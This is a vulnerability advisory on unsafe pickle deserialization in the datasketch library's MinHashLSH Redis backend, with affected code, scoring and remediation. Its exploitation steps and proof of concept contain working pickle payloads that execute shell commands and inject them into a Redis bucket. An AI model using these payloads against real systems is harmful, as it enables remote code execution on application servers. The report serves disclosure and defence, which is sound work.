# CVE Report: Unsafe Pickle Deserialization in datasketch MinHashLSH Redis Backend

## Summary

| Field              | Value                                                        |
|--------------------|--------------------------------------------------------------|
| **Product**        | datasketch                                                   |
| **Vendor**         | ekzhu (Eric Zhu)                                             |
| **Version**        | All versions up to and including 1.9.0                       |
| **Component**      | `datasketch.lsh.MinHashLSH`, `datasketch.experimental.aio.lsh.AsyncMinHashLSH` |
| **Vulnerability**  | Deserialization of Untrusted Data (Unsafe Pickle)            |
| **CWE**           | CWE-502: Deserialization of Untrusted Data                   |
| **CVSS 3.1 Score** | **9.8 Critical** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)    |
| **Attack Vector**  | Network                                                      |
| **Impact**         | Remote Code Execution (RCE)                                  |
| **Repository**     | https://github.com/ekzhu/datasketch                          |
| **License**        | MIT                                                          |
| **PyPI**           | https://pypi.org/project/datasketch/                         |

## Description

The `MinHashLSH` class in datasketch uses Python's `pickle.loads()` to deserialize index keys retrieved from storage backends. When a Redis backend is used (which is the standard configuration for production-scale deployments), the `prepickle` parameter defaults to `True`, causing all keys to be serialized with `pickle.dumps()` on insertion and deserialized with `pickle.loads()` on query.

An attacker who gains write access to the Redis instance can inject a maliciously crafted pickle payload as a bucket member. When a legitimate user subsequently queries the LSH index, the malicious payload is deserialized via `pickle.loads()`, resulting in **arbitrary code execution** on the application server.

Python's `pickle` module is [explicitly documented](https://docs.python.org/3/library/pickle.html) as unsafe for untrusted data:

> **Warning:** The pickle module is not secure. Only unpickle data you trust. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling.

## Affected Code

### Vulnerable Sink Locations

| File | Line | Method | Context |
|------|------|--------|---------|
| `datasketch/lsh.py` | 431 | `MinHashLSH.query()` | `pickle.loads(key) for key in candidates` |
| `datasketch/lsh.py` | 474 | `MinHashLSH.collect_query_buffer()` | `pickle.loads(key) for key in set.intersection(...)` |
| `datasketch/lsh.py` | 549 | `MinHashLSH.get_subset_counts()` | `pickle.loads(key) for key in candidates` |
| `datasketch/experimental/aio/lsh.py` | 312 | `AsyncMinHashLSH.query()` | `pickle.loads(key) for key in candidates` |

### Vulnerable Default Configuration

```python
# datasketch/lsh.py line 182
# When storage_config["type"] == "redis" and prepickle is not explicitly set,
# prepickle defaults to True — enabling the vulnerable code path automatically.
self.prepickle = storage_config["type"] == "redis" if prepickle is None else prepickle
```

### Data Flow (Source → Sink)

```
[Insertion - Trusted Path]
  user key (Hashable)
    → pickle.dumps(key)           # lsh.py:341
    → Redis SET member (bytes)    # stored in Redis hash table bucket

[Attack - Untrusted Injection]
  attacker writes crafted pickle payload directly to Redis
    → Redis SET member (malicious bytes)

[Query - Vulnerable Sink]
  lsh.query(minhash)
    → hashtable.get(H)            # lsh.py:428 — retrieves all members from Redis SET
    → candidates includes attacker-injected bytes
    → pickle.loads(key)           # lsh.py:431 — ARBITRARY CODE EXECUTION
```

## Attack Scenario

### Prerequisites

1. The target application uses `MinHashLSH` with a Redis backend (default `prepickle=True`).
2. The attacker has write access to the Redis instance. This can occur via:
   - **Direct access**: Redis exposed without authentication (Redis default).
   - **SSRF**: Server-Side Request Forgery allowing Redis protocol commands.
   - **Lateral movement**: Attacker on the same network segment.
   - **Compromised credentials**: Weak or leaked Redis AUTH password.
   - **Redis CVE exploitation**: Exploiting known Redis vulnerabilities.

### Exploitation Steps

1. **Reconnaissance**: Identify Redis keys used by datasketch. Keys follow a predictable naming pattern using the `basename` configuration parameter or a random prefix.

2. **Payload Crafting**: Construct a malicious pickle payload:

   ```python
   import pickle
   import os

   class Exploit(object):
       def __reduce__(self):
           return (os.system, ('id > /tmp/pwned',))

   payload = pickle.dumps(Exploit())
   ```

3. **Injection**: Write the payload into any datasketch hash table bucket in Redis:

   ```
   SADD "datasketch:<basename>:<hashtable_key>" "<malicious_pickle_bytes>"
   ```

4. **Trigger**: Wait for a legitimate user/service to execute `lsh.query(minhash)` where the minhash hashes into the poisoned bucket. The malicious payload is deserialized and the attacker's code executes with the privileges of the application process.

### Proof of Concept

```python
import pickle
import os
import redis
from datasketch import MinHash, MinHashLSH

# --- Attacker Side ---
class RCEPayload:
    def __reduce__(self):
        return (os.system, ('touch /tmp/CVE-datasketch-RCE-proof',))

malicious_bytes = pickle.dumps(RCEPayload())

r = redis.Redis(host='target-redis', port=6379)
# Inject into a known hash table bucket key in Redis
# The attacker needs to know (or brute-force) a valid bucket key
# In practice, bucket keys are deterministic hashes of minhash band values
r.sadd('datasketch_target_hashtable_bucket', malicious_bytes)

# --- Victim Side ---
lsh = MinHashLSH(
    threshold=0.5,
    num_perm=128,
    storage_config={'type': 'redis', 'redis': {'host': 'target-redis', 'port': 6379}},
    # prepickle defaults to True for Redis backend
)
m = MinHash(num_perm=128)
m.update(b'query_data')

# This call triggers pickle.loads() on all bucket members,
# including the attacker's payload → RCE
results = lsh.query(m)  # ← Arbitrary code execution occurs here
```

## Impact

| Impact Category       | Severity | Description |
|-----------------------|----------|-------------|
| **Confidentiality**   | HIGH     | Attacker can read arbitrary files, environment variables, secrets. |
| **Integrity**         | HIGH     | Attacker can modify files, inject backdoors, tamper with data. |
| **Availability**      | HIGH     | Attacker can crash the process, consume resources, or deploy ransomware. |
| **Scope**             | UNCHANGED | Exploitation affects only the vulnerable component's host. |
| **Privileges Required** | NONE   | No application-level authentication needed; only Redis write access. |
| **User Interaction**  | NONE     | Triggered automatically by normal LSH query operations. |

### Real-World Risk Factors

- **datasketch** has **2.6k+ GitHub stars** and is widely used in data deduplication, entity resolution, and near-duplicate detection pipelines.
- Redis backend is the recommended production configuration for large-scale deployments.
- Redis instances are frequently deployed without authentication on internal networks.
- The vulnerability is in the **read path** (query), making it a passive trigger — the victim does not need to perform any unusual action.

## CVSS 3.1 Vector

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Score: 9.8 (Critical)**

> Note: If the CVSS scoring considers that Redis write access constitutes a prerequisite privilege, `PR:L` would reduce the score to **8.8 (High)**. However, since Redis commonly runs without authentication and can be reached via SSRF (no application credential needed), `PR:N` is the more accurate assessment for real-world deployments.

## Recommended Remediation

### Short-Term (Mitigation)

1. **Disable `prepickle`**: Set `prepickle=False` and ensure all keys are `bytes`:
   ```python
   lsh = MinHashLSH(..., storage_config={'type': 'redis', ...}, prepickle=False)
   lsh.insert(b'my_key_as_bytes', minhash)
   ```
2. **Secure Redis**: Enable AUTH, use TLS, restrict network access via firewall rules, use Redis ACLs (Redis 6+).

### Long-Term (Fix)

1. **Replace `pickle` with a safe serialization format** for key storage. Since keys must be `Hashable`, viable alternatives include:
   - `json.dumps()`/`json.loads()` for JSON-serializable keys (strings, numbers, tuples).
   - `msgpack` or `cbor2` for broader type support without code execution risk.
   - A custom `struct`-based encoding for fixed key types.

2. **If `pickle` must be retained for backward compatibility**, implement:
   - A restricted `Unpickler` subclass that only allows safe types:
     ```python
     import pickle
     import io

     SAFE_TYPES = {str, bytes, int, float, tuple, list, set, frozenset, dict, type(None)}

     class SafeUnpickler(pickle.Unpickler):
         def find_class(self, module, name):
             import builtins
             if module == 'builtins' and getattr(builtins, name, None) in SAFE_TYPES:
                 return getattr(builtins, name)
             raise pickle.UnpicklingError(
                 f"Deserialization of {module}.{name} is blocked for security."
             )

     def safe_loads(data: bytes):
         return SafeUnpickler(io.BytesIO(data)).load()
     ```
   - Replace all `pickle.loads(key)` calls with `safe_loads(key)`.

3. **Change the default**: Set `prepickle=False` as the default for all backends, and require users to explicitly opt in with a security warning in the documentation.

4. **Add a deprecation warning** when `prepickle=True` is used with external storage backends.

## References

- Python pickle security warning: https://docs.python.org/3/library/pickle.html
- CWE-502: Deserialization of Untrusted Data: https://cwe.mitre.org/data/definitions/502.html
- OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- datasketch repository: https://github.com/ekzhu/datasketch
- datasketch PyPI: https://pypi.org/project/datasketch/

## Timeline

| Date       | Event                        |
|------------|------------------------------|
| 2026-03-25 | Vulnerability identified     |
| TBD        | Vendor notification          |
| TBD        | Vendor acknowledgement       |
| TBD        | Patch released               |
| TBD        | CVE ID assigned              |
| TBD        | Public disclosure            |

## Credit

Discovered during security review of datasketch v1.9.0.

---

**Disclosure Policy**: This report follows responsible disclosure practices. The vendor should be notified and given a reasonable remediation window (typically 90 days) before public disclosure.
